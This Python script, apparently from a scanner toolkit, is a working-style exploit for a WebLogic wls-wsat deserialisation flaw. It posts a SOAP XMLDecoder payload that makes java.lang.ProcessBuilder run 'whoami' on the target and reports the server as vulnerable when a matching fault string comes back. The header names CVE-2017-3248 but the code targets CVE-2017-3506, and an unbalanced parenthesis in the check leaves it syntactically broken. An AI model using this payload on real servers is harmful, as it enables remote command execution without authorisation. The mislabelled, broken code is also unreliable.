#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
# CVE-2017-3248
# 该漏洞不会直接回显
# updated 2019/11/1
# by 0xn0ne

from stars import universe, Star, target_type
from utils import http
from lib import *
import logging
from lib.Urldeal import umethod
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning


def cve_2017_3506(Url):
    cmd = 'whoami'
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    vulurl = urldata + 'wls-wsat/CoordinatorPortType'
    data = '''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            '''
    for idx, it in enumerate(cmd.split()):
        data += '<void index="{}"><string>{}</string></void>'.format(idx, it)
    data += '''
          </array>
          <void method="start"/>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>'''
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    headers = {'Content-Type': 'text/xml'}
    vulhub = requests.post(url=vulurl,data=data,headers=headers)
    try:
      if vulhub != None and ('<faultstring>java.lang.ProcessBuilder' in vulhub.text or "<faultstring>0" in vulhub.text:
        print(Vcolors.RED + "[!] weblogic存在cve_2017_3506漏洞\r" + Vcolors.ENDC)
    
    except Exception as e :
        logging.error("weblogic cve_2017_3506脚本出现异常")